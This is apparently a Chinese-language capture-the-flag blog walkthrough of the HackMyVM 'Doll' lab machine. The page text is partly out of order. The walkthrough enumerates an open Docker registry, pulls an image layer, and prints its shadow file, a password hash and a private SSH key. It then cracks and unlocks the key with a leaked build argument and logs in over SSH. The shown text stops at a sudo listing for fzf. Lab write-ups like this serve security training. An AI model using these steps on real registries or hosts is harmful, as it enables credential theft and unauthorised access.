+         'v1Compatibility': '{\'architecture\':\'amd64\',\'config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'container\':\'10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\',\'container_config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'created\':\'2023-04-25T08:58:11.460540528Z\',\'docker_version\':\'23.0.4\',\'id\':\'89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\',\'os\':\'linux\',\'parent\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\'}'
+      },
+      {
+         'v1Compatibility': '{\'id\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\',\'parent\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'comment\':\'buildkit.dockerfile.v0\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'ARG passwd=devilcollectsit\']},\'throwaway\':true}'
+      },
+      {
+         'v1Compatibility': '{\'id\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'parent\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop)  CMD [\\\'/bin/sh\\\']\']},\'throwaway\':true}'
+      },
+      {
+         'v1Compatibility': '{\'id\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.348438709Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \']}}'
+      }
+   ],
+   'signatures': [
+      {
+         'header': {
+            'jwk': {
+               'crv': 'P-256',
+               'kid': 'X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS',
+               'kty': 'EC',
+               'x': 'm6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c',
+               'y': 'WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA'
+            },
+            'alg': 'ES256'
+         },
+         'signature': 'n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg',
+         'protected': 'eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ'
+      }
+   ]
+}                                                                                                                                     
+
+┌──(kali㉿kali)-[~/test]
+└─$ mkdir tmp     
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cd tmp 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ curl http://192.168.72.129:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 -o blob1.tar
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3707  100  3707    0     0   971k      0 --:--:-- --:--:-- --:--:-- 1206k
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ tar -xf blob1.tar
+                         
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls -la
+总计 24
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
+drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
+-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
+drwx------ 2 kali kali 4096 2023年 4月25日 root
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cd etc 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ ls -al
+总计 32
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
+-rw-r--r-- 1 kali kali  710 2023年 4月25日 group
+-rw-r--r-- 1 kali kali  697 2022年11月 4日 group-
+-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd
+-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd-
+-rw-r----- 1 kali kali  553 2023年 4月25日 shadow
+-rw-r----- 1 kali kali  448 2023年 4月25日 shadow-
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ cat *   
+root:x:0:root
+bin:x:1:root,bin,daemon
+daemon:x:2:root,bin,daemon
+sys:x:3:root,bin,adm
+adm:x:4:root,adm,daemon
+tty:x:5:
+disk:x:6:root,adm
+lp:x:7:lp
+mem:x:8:
+kmem:x:9:
+wheel:x:10:root
+floppy:x:11:root
+mail:x:12:mail
+news:x:13:news
+uucp:x:14:uucp
+man:x:15:man
+cron:x:16:cron
+console:x:17:
+audio:x:18:
+cdrom:x:19:
+dialout:x:20:root
+ftp:x:21:
+sshd:x:22:
+input:x:23:
+at:x:25:at
+tape:x:26:root
+video:x:27:root
+netdev:x:28:
+readproc:x:30:
+squid:x:31:squid
+xfs:x:33:xfs
+kvm:x:34:kvm
+games:x:35:
+shadow:x:42:
+cdrw:x:80:
+www-data:x:82:
+usb:x:85:
+vpopmail:x:89:
+users:x:100:games
+ntp:x:123:
+nofiles:x:200:
+smmsp:x:209:smmsp
+locate:x:245:
+abuild:x:300:
+utmp:x:406:
+ping:x:999:
+nogroup:x:65533:
+nobody:x:65534:
+bela:x:1000:
+root:x:0:root
+bin:x:1:root,bin,daemon
+daemon:x:2:root,bin,daemon
+sys:x:3:root,bin,adm
+adm:x:4:root,adm,daemon
+tty:x:5:
+disk:x:6:root,adm
+lp:x:7:lp
+mem:x:8:
+kmem:x:9:
+wheel:x:10:root
+floppy:x:11:root
+mail:x:12:mail
+news:x:13:news
+uucp:x:14:uucp
+man:x:15:man
+cron:x:16:cron
+console:x:17:
+audio:x:18:
+cdrom:x:19:
+dialout:x:20:root
+ftp:x:21:
+sshd:x:22:
+input:x:23:
+at:x:25:at
+tape:x:26:root
+video:x:27:root
+netdev:x:28:
+readproc:x:30:
+squid:x:31:squid
+xfs:x:33:xfs
+kvm:x:34:kvm
+games:x:35:
+shadow:x:42:
+cdrw:x:80:
+www-data:x:82:
+usb:x:85:
+vpopmail:x:89:
+users:x:100:games
+ntp:x:123:
+nofiles:x:200:
+smmsp:x:209:smmsp
+locate:x:245:
+abuild:x:300:
+utmp:x:406:
+ping:x:999:
+nogroup:x:65533:
+nobody:x:65534:
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
+root:*::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+adm:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+operator:!::0:::::
+man:!::0:::::
+postmaster:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+at:!::0:::::
+squid:!::0:::::
+xfs:!::0:::::
+games:!::0:::::
+cyrus:!::0:::::
+vpopmail:!::0:::::
+ntp:!::0:::::
+smmsp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+bela:$6$azVVFjn.mkvh.lhA$yAXPBGOZDXRdDBmn3obtzhUzxwfDD7u3YIcixohpKzTGpJS0Oeu7UVoguhmwg4DHNM8K5z7Tn93BBaDadM/A5.:19472:0:99999:7:::
+root:*::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+adm:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+operator:!::0:::::
+man:!::0:::::
+postmaster:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+at:!::0:::::
+squid:!::0:::::
+xfs:!::0:::::
+games:!::0:::::
+cyrus:!::0:::::
+vpopmail:!::0:::::
+ntp:!::0:::::
+smmsp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+bela:!:19472:0:99999:7:::
+                                 
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ cd ..                                
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls la 
+ls: 无法访问 'la': 没有那个文件或目录
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls -la
+总计 24
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
+drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
+-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
+drwx------ 2 kali kali 4096 2023年 4月25日 root
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cd home 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home]
+└─$ ls -al
+总计 12
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 .
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 bela
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home]
+└─$ cd bela 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ l -al 
+总计 16
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ./
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ../
+-rw------- 1 kali kali   57 2023年 4月25日 .ash_history
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .ssh/
+-rwxr-xr-x 1 kali kali    0 1969年12月31日 .wh..wh..opq*
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cat .ash_history                     
+pwd
+ls -la
+mkdir .ssh
+cd .ssh
+nano id_rsa
+vi id_rsa
+exit
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cat .wh..wh..opq
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cd .ssh       
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ls -al
+总计 12
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ..
+-rw-r--r-- 1 kali kali 2635 2023年 4月25日 id_rsa
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ cat id_rsa    
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+VtVwCw==
+-----END OPENSSH PRIVATE KEY-----
+                                             
+```
+
+省了，都不用爆破shadow了
+
+```
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh2john id_rsa > hash
+                                         
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:01:24 0.05% (ETA: 2025-01-31 17:41) 0g/s 105.4p/s 105.4c/s 105.4C/s passat..kicker
+0g 0:00:01:39 0.06% (ETA: 2025-01-31 17:26) 0g/s 105.9p/s 105.9c/s 105.9C/s strokes..jhoan
+
+```
+
+爆破不出来，不会是用这个吧
+
+![image](assets/image-20250129204242-qkg0s6r.png)
+
+试试
+
+```
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ chmod 600 id_rsa 
+
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh bela@192.168.72.129 -i id_rsa
+ssh: connect to host 192.168.72.129 port 22: No route to host
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh bela@192.168.72.129 -i id_rsa
+Enter passphrase for key 'id_rsa': 
+Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
+bela@doll:~$ id
+uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+
+```
+
+# 3.提权
+
+```
+bela@doll:~$ sudo -l
+Matching Defaults entries for bela on doll:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bela may run the following commands on doll:
+    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337
+
+```
+
+​`fzf`​ 是一个交互式命令行模糊查找工具，并且其 `--listen`​ 选项允许它接收来自远程连接的命令。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_Doll.html">
+<meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
+<title>hmv_Doll</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_Doll</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/18" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>hmv_Doll</h1>
+<h1>0.闲聊</h1>
+<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250129201949-6vewhf4.png"><img src="assets/image-20250129201949-6vewhf4.png" alt="image" style="max-width: 100%;"></a></p>
+<p><strong>靶机：</strong> <a href="https://hackmyvm.eu/machines/machine.php?vm=Doll" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=Doll</a></p>
+<p><strong>靶机 IP：</strong> 192.168.72.129</p>
+<p><strong>kali IP：</strong> 192.168.72.128</p>
+<p>今天年初二，有点空，更新一下wp</p>
+<h1>1.扫描</h1>
+<p>​<code class="notranslate">nmap</code>​开扫</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS -Pn -n -p- --min-rate 10000 192.168.72.129
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:16 EST
+Nmap scan report for 192.168.72.129
+Host is up (0.00020s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+1007/tcp open  unknown
+MAC Address: 08:00:27:F7:F4:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
+                                                                  
+</code></pre>
+<p>其中<code class="notranslate">1007</code>​不知道是什么服务，我们详细扫描一下</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -sT -sV -Pn -n -p1007 192.168.72.129        
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:17 EST
+Nmap scan report for 192.168.72.129
+Host is up (0.00039s latency).
+
+PORT     STATE SERVICE VERSION
+1007/tcp open  http    Docker Registry (API: 2.0)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds
+
+</code></pre>
+<p>不知道是什么东西，我们等会搜索一下</p>
+<h1>2.踩点</h1>
+<p>在<strong>hacktricks</strong>​上找到<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html" rel="nofollow">5000 - Pentesting Docker Registry</a>这篇文章</p>
+<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250129202845-u4dct3k.png"><img src="assets/image-20250129202845-u4dct3k.png" alt="image" style="max-width: 100%;"></a></p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/_catalog
+{"repositories":["dolly"]}
+                              
+</code></pre>
+<p>继续利用</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/dolly/tags/list
+{"name":"dolly","tags":["latest"]}
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/dolly/manifests/latest
+{
+   "schemaVersion": 1,
+   "name": "dolly",
+   "tag": "latest",
+   "architecture": "amd64",
+   "fsLayers": [
+      {
+         "blobSum": "sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09"
+      }
+   ],
+   "history": [
+      {
+         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"container\":\"10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\",\"container_config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"created\":\"2023-04-25T08:58:11.460540528Z\",\"docker_version\"